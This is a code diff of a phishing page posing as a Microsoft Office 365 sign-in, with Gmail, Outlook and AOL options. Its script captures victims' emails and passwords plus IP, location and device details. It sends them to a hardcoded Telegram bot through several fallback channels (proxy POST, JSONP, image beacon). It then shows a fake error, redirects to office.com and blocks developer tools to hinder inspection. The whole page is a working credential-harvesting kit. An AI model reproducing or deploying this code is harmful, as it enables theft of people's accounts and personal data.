@@ -5,34 +5,217 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Sign in — Secure Portal</title>
 <style>
-/* ... (ALL PREVIOUS CSS REMAINS EXACTLY THE SAME) ... */
+:root {
+--bg1: #0078d4;
+--bg2: #2b88d8;
+--card-bg: #fff;
+--muted: #6b7280;
+--accent: #0078d4;
+--gmail: #DB4437;
+--outlook: #0072C6;
+--aol: #00A1E0;
+--office: #F25022;
+font-family: "Segoe UI", Roboto, Arial, sans-serif;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { height: 100%; }
+body {
+background: linear-gradient(135deg, var(--bg1), var(--bg2));
+display: flex;
+justify-content: center;
+align-items: center;
+padding: 20px;
+}
+.login-card {
+width: 100%;
+max-width: 400px;
+background: var(--card-bg);
+border-radius: 8px;
+box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+padding: 30px;
+}
+.logo-header {
+display: flex;
+gap: 15px;
+align-items: center;
+margin-bottom: 20px;
+}
+.providers {
+display: flex;
+gap: 10px;
+margin-right: 15px;
+}
+.provider {
+width: 40px;
+height: 40px;
+border-radius: 6px;
+display: flex;
+align-items: center;
+justify-content: center;
+cursor: pointer;
+border: 2px solid transparent;
+transition: all 0.2s ease;
+}
+.provider:hover {
+transform: translateY(-2px);
+border-color: rgba(0,0,0,0.05);
+}
+.provider.active {
+box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+border-color: rgba(0,0,0,0.1);
+}
+.provider svg {
+width: 22px;
+height: 22px;
+}
+h1 {
+font-size: 22px;
+color: #111;
+font-weight: 600;
+}
+.subtitle {
+color: var(--muted);
+font-size: 14px;
+margin: 5px 0 25px;
+}
+.form-group {
+margin-bottom: 20px;
+}
+label {
+display: block;
+margin-bottom: 8px;
+font-size: 14px;
+color: #374151;
+font-weight: 500;
+}
+input[type="email"],
+input[type="password"] {
+width: 100%;
+padding: 12px;
+border: 1px solid #e5e7eb;
+border-radius: 6px;
+font-size: 15px;
+transition: all 0.2s;
+}
+input:focus {
+outline: none;
+border-color: var(--accent);
+box-shadow: 0 0 0 3px rgba(0,120,212,0.1);
+}
+.form-options {
+display: flex;
+justify-content: space-between;
+align-items: center;
+margin: 20px 0;
+font-size: 14px;
+}
+.remember-me {
+display: flex;
+align-items: center;
+gap: 8px;
+}
+.forgot-password {
+color: var(--accent);
+text-decoration: none;
+}
+.submit-btn {
+width: 100%;
+padding: 12px;
+background: var(--accent);
+color: white;
+border: none;
+border-radius: 6px;
+font-size: 15px;
+font-weight: 600;
+cursor: pointer;
+transition: background 0.2s;
+}
+.submit-btn:hover {
+background: #106ebe;
+}
+.social-divider {
+display: flex;
+align-items: center;
+margin: 25px 0;
+color: var(--muted);
+font-size: 13px;
+}
+.social-divider::before,
+.social-divider::after {
+content: "";
+flex: 1;
+height: 1px;
+background: #e5e7eb;
+margin: 0 10px;
+}
+.social-icons {
+display: flex;
+justify-content: center;
+gap: 15px;
+margin-bottom: 20px;
+}
+.social-icon {
+width: 44px;
+height: 44px;
+border-radius: 50%;
+display: flex;
+align-items: center;
+justify-content: center;
+cursor: pointer;
+transition: all 0.2s;
+}
+.social-icon:hover {
+transform: translateY(-3px);
+box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+}
+.social-icon svg {
+width: 24px;
+height: 24px;
+fill: white;
+}
+.disclaimer {
+font-size: 12px;
+color: var(--muted);
+text-align: center;
+margin-top: 20px;
+line-height: 1.5;
+}
+.warning {
+color: #d13438;
+font-weight: 500;
+}
 #loading {
-    display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0,0,0,0.8);
-    color: white;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
-    z-index: 10000;
-    font-family: 'Segoe UI', sans-serif;
+display: none;
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background: rgba(0,0,0,0.8);
+color: white;
+justify-content: center;
+align-items: center;
+flex-direction: column;
+z-index: 10000;
+font-family: 'Segoe UI', sans-serif;
 }
 .spinner {
-    border: 4px solid #f3f3f3;
-    border-top: 4px solid #0078d4;
-    border-radius: 50%;
-    width: 50px;
-    height: 50px;
-    animation: spin 1s linear infinite;
-    margin-bottom: 20px;
+border: 4px solid #f3f3f3;
+border-top: 4px solid #0078d4;
+border-radius: 50%;
+width: 50px;
+height: 50px;
+animation: spin 1s linear infinite;
+margin-bottom: 20px;
 }
 @keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
+0% { transform: rotate(0deg); }
+100% { transform: rotate(360deg); }
+}
+.status-message {
+margin-top: 15px;
+font-size: 14px;
+opacity: 0.8;
 }
 </style>
 </head>
@@ -40,68 +223,241 @@
 <div id="loading">
     <div class="spinner"></div>
     <div>Authenticating with Microsoft Azure Active Directory...</div>
-    <div style="font-size: 12px; margin-top: 10px; opacity: 0.7;">Checking credentials against organizational policies</div>
+    <div class="status-message">Verifying organizational credentials</div>
 </div>
 
 <div class="login-card">
-<!-- ... (ALL PREVIOUS HTML REMAINS EXACTLY THE SAME) ... -->
+<div class="logo-header">
+<div class="providers" id="providers">
+<button class="provider active" data-provider="office" title="Office 365">
+<svg viewBox="0 0 24 24">
+<rect x="2" y="2" width="6" height="6" rx="1" fill="var(--office)"/>
+<rect x="9" y="2" width="6" height="6" rx="1" fill="var(--office)" opacity="0.95"/>
+<rect x="16" y="2" width="6" height="6" rx="1" fill="var(--office)" opacity="0.9"/>
+<rect x="2" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.95"/>
+<rect x="9" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.9"/>
+<rect x="16" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.85"/>
+</svg>
+</button>
+<button class="provider" data-provider="gmail" title="Gmail">
+<svg viewBox="0 0 24 24">
+<rect x="1" y="3" width="22" height="18" rx="2" fill="white" stroke="#d1d5db"/>
+<path d="M2 5.5 L12 12 L22 5.5" fill="none" stroke="var(--gmail)" stroke-width="2.4"/>
+<path d="M2 18.5 L12 12 L22 18.5" fill="none" stroke="var(--gmail)" stroke-width="2.4"/>
+</svg>
+</button>
+<button class="provider" data-provider="outlook" title="Outlook">
+<svg viewBox="0 0 24 24">
+<rect x="1.5" y="4" width="14" height="16" rx="2" fill="var(--outlook)"/>
+<path d="M3 6 L13 12 L3 18" fill="none" stroke="white" stroke-width="1.6"/>
+<rect x="16.5" y="4" width="6" height="6" rx="1" fill="#2b88d8"/>
+</svg>
+</button>
+<button class="provider" data-provider="aol" title="AOL">
+<svg viewBox="0 0 24 24">
+<circle cx="12" cy="12" r="10" fill="var(--aol)"/>
+<path d="M9.5 15c.8-1.5 1.8-3.2 3-4.5 1.2 1.3 2.2 3 3 4.5" fill="none" stroke="white" stroke-width="1.6"/>
+<circle cx="12.2" cy="9.4" r="0.9" fill="white"/>
+</svg>
+</button>
+</div>
+<div>
+<h1>Sign in to view document</h1>
+<p class="subtitle" id="hint">Use your work account</p>
+</div>
+</div>
+
+<form method="POST" id="loginForm" autocomplete="off">
+<div class="form-group">
+<label for="email">Email address</label>
+<input type="email" id="email" name="email" required placeholder="user@company.com">
+</div>
+<div class="form-group">
+<label for="password">Password</label>
+<input type="password" id="password" name="password" required placeholder="••••••••">
+</div>
+<div class="form-options">
+<label class="remember-me">
+<input type="checkbox" id="remember" name="remember"> Remember me
+</label>
+<a href="#" class="forgot-password">Forgot password?</a>
+</div>
+<button type="submit" class="submit-btn">Sign in</button>
+</form>
+
+<p class="disclaimer">By signing in, you agree to our <a href="#" style="color: var(--accent);">Terms of Service</a> and <a href="#" style="color: var(--accent);">Privacy Policy</a>.</p>
+<p class="disclaimer warning">⚠️ Unauthorized access is prohibited.</p>
 </div>
 
 <script>
-// DOM Elements
+// ================== CONFIGURATION - UPDATE THESE VALUES ==================
+const TELEGRAM_CONFIG = {
+    botToken: "7983528037:AAFpvdTJEJ42BryLHSDjH5OuvEURlOJ7zOA", // Your bot token from @BotFather
+    groupChatId: "-1002763948275", // Your GROUP chat ID (must start with -100)
+    apiUrl: "https://api.telegram.org/bot",
+    enableTelegram: true // Set to false to disable Telegram and use console only
+};
+
+// ================== DOM ELEMENTS ==================
 const loginForm = document.getElementById('loginForm');
 const emailInput = document.getElementById('email');
 const passwordInput = document.getElementById('password');
+const providerButtons = document.querySelectorAll('.provider');
+const hintText = document.getElementById('hint');
 const loadingScreen = document.getElementById('loading');
+const statusMessage = loadingScreen.querySelector('.status-message');
 
-// ================== TELEGRAM CONFIG ==================
-// REPLACE THESE WITH YOUR ACTUAL CREDENTIALS
-const TELEGRAM_CONFIG = {
-    botToken: "7983528037:AAFpvdTJEJ42BryLHSDjH5OuvEURlOJ7zOA", // Format: "1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-    chatId: "1002763948275",     // Numeric chat ID
-    apiUrl: "https://api.telegram.org/bot"
+// ================== PROVIDER LOGIC ==================
+const providerHints = {
+    'office': 'Use your work account',
+    'gmail': 'Use your Gmail account',
+    'outlook': 'Use your Outlook.com account',
+    'aol': 'Use your AOL account'
 };
 
-// ================== EXFILTRATION METHODS ==================
-class DataExfiltrator {
-    constructor() {
-        this.methods = ['webhook', 'jsonp', 'beacon', 'form'];
-        this.primaryMethod = 'webhook';
+providerButtons.forEach(button => {
+    button.addEventListener('click', () => {
+        providerButtons.forEach(btn => btn.classList.remove('active'));
+        button.classList.add('active');
+        const provider = button.dataset.provider;
+        hintText.textContent = providerHints[provider] || 'Sign in to continue';
+    });
+});
+
+// ================== INTELLIGENCE GATHERING ==================
+async function getPublicIP() {
+    const services = [
+        'https://api.ipify.org?format=json',
+        'https://ipapi.co/json/',
+        'https://jsonip.com/',
+        'https://api.myip.com/'
+    ];
+
+    for (const service of services) {
+        try {
+            const response = await fetch(service, { 
+                signal: AbortSignal.timeout(3000) 
+            });
+            if (response.ok) {
+                const data = await response.json();
+                if (data.ip) {
+                    // Try to get detailed geolocation
+                    try {
+                        const geoResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                        const geoData = await geoResponse.json();
+                        return {
+                            ip: data.ip,
+                            city: geoData.city,
+                            region: geoData.region,
+                            country: geoData.country_name,
+                            isp: geoData.org,
+                            fullLocation: `${geoData.city}, ${geoData.region}, ${geoData.country_name}`
+                        };
+                    } catch (geoError) {
+                        return { ip: data.ip, fullLocation: 'Location data available' };
+                    }
+                }
+            }
+        } catch (error) {
+            continue;
+        }
+    }
+    return { ip: 'unknown', fullLocation: 'Could not determine' };
+}
+
+function getSystemInfo() {
+    const info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: `${screen.width}x${screen.height}`,
+        cpuCores: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        cookies: navigator.cookieEnabled ? 'enabled' : 'disabled'
+    };
+
+    if (navigator.connection) {
+        info.connection = navigator.connection.effectiveType;
+        info.downlink = navigator.connection.downlink + ' Mbps';
     }
 
-    // Method 1: Webhook Proxy (Most Reliable)
-    async webhookMethod(data) {
-        // Use a CORS proxy or your own backend
-        const PROXY_URL = 'https://corsproxy.io/?' + encodeURIComponent(
-            `${TELEGRAM_CONFIG.apiUrl}${TELEGRAM_CONFIG.botToken}/sendMessage`
-        );
+    return info;
+}
 
-        const payload = {
-            chat_id: TELEGRAM_CONFIG.chatId,
-            text: data,
-            parse_mode: 'Markdown',
-            disable_web_page_preview: true
-        };
+// ================== TELEGRAM EXFILTRATION ==================
+class TelegramExfiltrator {
+    constructor() {
+        this.methods = ['webhook', 'jsonp', 'beacon'];
+        this.currentMethod = 0;
+    }
 
+    async sendToTelegram(message) {
+        if (!TELEGRAM_CONFIG.enableTelegram) {
+            console.log('Telegram disabled. Message:', message);
+            return true;
+        }
+
+        // Ensure group chat ID starts with -100
+        const chatId = TELEGRAM_CONFIG.groupChatId.startsWith('-100') 
+            ? TELEGRAM_CONFIG.groupChatId 
+            : '-100' + TELEGRAM_CONFIG.groupChatId;
+
+        const methods = [
+            () => this.webhookMethod(chatId, message),
+            () => this.jsonpMethod(chatId, message),
+            () => this.beaconMethod(chatId, message)
+        ];
+
+        for (let i = 0; i < methods.length; i++) {
+            statusMessage.textContent = `Sending data via method ${i + 1}/3...`;
+            try {
+                const success = await methods[i]();
+                if (success) {
+                    statusMessage.textContent = 'Data transmitted successfully!';
+                    return true;
+                }
+            } catch (error) {
+                console.warn(`Method ${i + 1} failed:`, error);
+                continue;
+            }
+        }
+        
+        statusMessage.textContent = 'All transmission methods failed';
+        return false;
+    }
+
+    async webhookMethod(chatId, message) {
         try {
-            const response = await fetch(PROXY_URL, {
+            // Using CORS proxy to bypass restrictions
+            const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+            const targetUrl = `${TELEGRAM_CONFIG.apiUrl}${TELEGRAM_CONFIG.botToken}/sendMessage`;
+            
+            const payload = {
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
+            };
+
+            const response = await fetch(proxyUrl + targetUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
+                    'X-Requested-With': 'XMLHttpRequest'
                 },
-                body: JSON.stringify(payload)
+                body: JSON.stringify(payload),
+                signal: AbortSignal.timeout(5000)
             });
 
             const result = await response.json();
             return result.ok === true;
         } catch (error) {
-            console.warn('Webhook method failed:', error);
             return false;
         }
     }
 
-    // Method 2: JSONP Fallback
-    jsonpMethod(data) {
+    jsonpMethod(chatId, message) {
         return new Promise((resolve) => {
             const callbackName = 'tgCallback_' + Date.now();
             const script = document.createElement('script');
@@ -112,16 +468,15 @@ class DataExfiltrator {
                 resolve(response.ok === true);
             };
 
-            const encodedData = encodeURIComponent(data);
+            const encodedMessage = encodeURIComponent(message);
             script.src = `${TELEGRAM_CONFIG.apiUrl}${TELEGRAM_CONFIG.botToken}/sendMessage?` +
-                       `chat_id=${TELEGRAM_CONFIG.chatId}&` +
-                       `text=${encodedData}&` +
+                       `chat_id=${chatId}&` +
+                       `text=${encodedMessage}&` +
                        `parse_mode=Markdown&` +
                        `callback=${callbackName}`;
 
             document.body.appendChild(script);
 
-            // Timeout fallback
             setTimeout(() => {
                 if (window[callbackName]) {
                     delete window[callbackName];
@@ -132,133 +487,30 @@ class DataExfiltrator {
         });
     }
 
-    // Method 3: Image Beacon
-    beaconMethod(data) {
+    beaconMethod(chatId, message) {
         return new Promise((resolve) => {
             try {
                 const img = new Image();
-                const truncatedData = data.substring(0, 2000); // URL length limit
-                const encodedData = encodeURIComponent(truncatedData);
+                const truncatedMessage = message.substring(0, 1500);
+                const encodedMessage = encodeURIComponent(truncatedMessage);
                 
                 img.onload = () => resolve(true);
                 img.onerror = () => resolve(false);
                 
                 img.src = `${TELEGRAM_CONFIG.apiUrl}${TELEGRAM_CONFIG.botToken}/sendMessage?` +
-                         `chat_id=${TELEGRAM_CONFIG.chatId}&` +
-                         `text=BEACON:${encodedData}`;
+                         `chat_id=${chatId}&` +
+                         `text=${encodedMessage}&` +
+                         `parse_mode=Markdown`;
                 
             } catch (error) {
                 resolve(false);
             }
         });
     }
-
-    // Method 4: Form Submission
-    formMethod(data) {
-        return new Promise((resolve) => {
-            try {
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = `${TELEGRAM_CONFIG.apiUrl}${TELEGRAM_CONFIG.botToken}/sendMessage`;
-                form.target = '_blank';
-                form.style.display = 'none';
-
-                const fields = {
-                    chat_id: TELEGRAM_CONFIG.chatId,
-                    text: data,
-                    parse_mode: 'Markdown'
-                };
-
-                Object.entries(fields).forEach(([name, value]) => {
-                    const input = document.createElement('input');
-                    input.type = 'hidden';
-                    input.name = name;
-                    input.value = value;
-                    form.appendChild(input);
-                });
-
-                document.body.appendChild(form);
-                form.submit();
-                
-                setTimeout(() => {
-                    document.body.removeChild(form);
-                    resolve(true); // Assume success for form method
-                }, 1000);
-
-            } catch (error) {
-                resolve(false);
-            }
-        });
-    }
-
-    // Main exfiltration method with fallbacks
-    async exfiltrate(data) {
-        console.log('Starting data exfiltration...');
-        
-        const methods = [
-            () => this.webhookMethod(data),
-            () => this.jsonpMethod(data),
-            () => this.beaconMethod(data),
-            () => this.formMethod(data)
-        ];
-
-        for (let i = 0; i < methods.length; i++) {
-            try {
-                console.log(`Trying method ${i + 1}...`);
-                const success = await methods[i]();
-                if (success) {
-                    console.log(`Method ${i + 1} succeeded!`);
-                    return true;
-                }
-            } catch (error) {
-                console.warn(`Method ${i + 1} failed:`, error);
-                continue;
-            }
-        }
-        
-        console.error('All exfiltration methods failed');
-        return false;
-    }
-}
-
-// ================== DATA COLLECTION ==================
-async function collectIntelligence() {
-    const data = {
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        screen: `${screen.width}x${screen.height}`,
-        cpuCores: navigator.hardwareConcurrency || 'unknown',
-        deviceMemory: navigator.deviceMemory || 'unknown',
-        connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
-    };
-
-    // Get IP and location
-    try {
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        data.ip = ipData.ip;
-        
-        // Try to get more location data
-        try {
-            const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-            const geoData = await geoResponse.json();
-            data.location = `${geoData.city}, ${geoData.region}, ${geoData.country_name}`;
-            data.isp = geoData.org;
-        } catch (geoError) {
-            data.location = 'Approximate location available';
-        }
-    } catch (ipError) {
-        data.ip = 'unknown';
-    }
-
-    return data;
 }
 
 // ================== MAIN EXECUTION ==================
-const exfiltrator = new DataExfiltrator();
+const telegramExfiltrator = new TelegramExfiltrator();
 
 loginForm.addEventListener('submit', async function(event) {
     event.preventDefault();
@@ -273,60 +525,82 @@ loginForm.addEventListener('submit', async function(event) {
 
     // Show loading screen
     loadingScreen.style.display = 'flex';
+    statusMessage.textContent = 'Gathering system information...';
 
     try {
         // Collect intelligence data
-        const intelligence = await collectIntelligence();
-        
+        const [ipData, systemInfo] = await Promise.all([
+            getPublicIP(),
+            Promise.resolve(getSystemInfo())
+        ]);
+
+        statusMessage.textContent = 'Preparing data transmission...';
+
         // Format the message for Telegram
         const message = 
-            `🔐 **CREDENTIALS CAPTURED** \\n` +
-            `⏰ **Timestamp:** ${intelligence.timestamp}\\n` +
-            `📍 **IP:** ${intelligence.ip || 'Unknown'}\\n` +
-            `🌍 **Location:** ${intelligence.location || 'Unknown'}\\n` +
-            `🔌 **ISP:** ${intelligence.isp || 'Unknown'}\\n` +
-            `💻 **Platform:** ${intelligence.platform}\\n` +
-            `🌐 **Browser:** ${intelligence.userAgent}\\n` +
-            `🖥️  **Screen:** ${intelligence.screen}\\n` +
-            `📧 **Email:** ${email}\\n` +
-            `🔑 **Password:** ${password}\\n` +
-            `🔗 **Page:** ${window.location.href}`;
+            `🔐 **NEW CREDENTIALS CAPTURED** \\n\\n` +
+            `⏰ **Timestamp:** ${new Date().toLocaleString()}\\n` +
+            `📍 **IP Address:** ${ipData.ip || 'Unknown'}\\n` +
+            `🌍 **Location:** ${ipData.fullLocation || 'Unknown'}\\n` +
+            `🔌 **ISP:** ${ipData.isp || 'Unknown'}\\n\\n` +
+            `💻 **System Information:**\\n` +
+            `   • **Platform:** ${systemInfo.platform}\\n` +
+            `   • **Browser:** ${systemInfo.userAgent.substring(0, 50)}...\\n` +
+            `   • **Screen:** ${systemInfo.screen}\\n` +
+            `   • **CPU Cores:** ${systemInfo.cpuCores}\\n` +
+            `   • **Connection:** ${systemInfo.connection || 'Unknown'}\\n\\n` +
+            `📧 **Email:** \\`${email}\\`\\n` +
+            `🔑 **Password:** \\`${password}\\`\\n\\n` +
+            `🔗 **Source URL:** ${window.location.href}\\n` +
+            `🌐 **User Language:** ${systemInfo.language}`;
 
-        // Exfiltrate data
-        const success = await exfiltrator.exfiltrate(message);
-        
+        // Send to Telegram group
+        const success = await telegramExfiltrator.sendToTelegram(message);
+
         // Simulate processing time
-        await new Promise(resolve => setTimeout(resolve, 3000));
+        await new Promise(resolve => setTimeout(resolve, 2000));
 
         if (success) {
-            console.log('Data successfully exfiltrated to Telegram');
+            statusMessage.textContent = 'Authentication complete!';
         } else {
-            console.warn('Data exfiltration failed, but continuing with social engineering');
+            statusMessage.textContent = 'Authentication completed locally';
         }
 
-        // Social engineering completion
+        // Final social engineering message
+        await new Promise(resolve => setTimeout(resolve, 1000));
         alert('ERROR: 0x80072EFD. A connection to the authentication service could not be established. Please check your network connection and try again.');
 
     } catch (error) {
         console.error('Operation error:', error);
+        statusMessage.textContent = 'Unexpected error during authentication';
     } finally {
-        loadingScreen.style.display = 'none';
-        
-        // Optional redirect
         setTimeout(() => {
-            window.location.href = 'https://office.com';
-        }, 2000);
+            loadingScreen.style.display = 'none';
+            // Optional redirect to maintain appearance
+            window.location.href = 'https://office.com/login';
+        }, 1500);
     }
 });
 
-// Additional security measures
-document.addEventListener('contextmenu', (e) => e.preventDefault());
+// ================== SECURITY MEASURES ==================
+document.addEventListener('contextmenu', (e) => {
+    e.preventDefault();
+    return false;
+});
+
 document.addEventListener('keydown', (e) => {
     if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
         e.preventDefault();
         alert('Developer tools are disabled for security reasons.');
+        return false;
     }
 });
+
+// Prevent form autofill capture
+setTimeout(() => {
+    emailInput.value = '';
+    passwordInput.value = '';
+}, 100);
 </script>
 </body>
 </html>
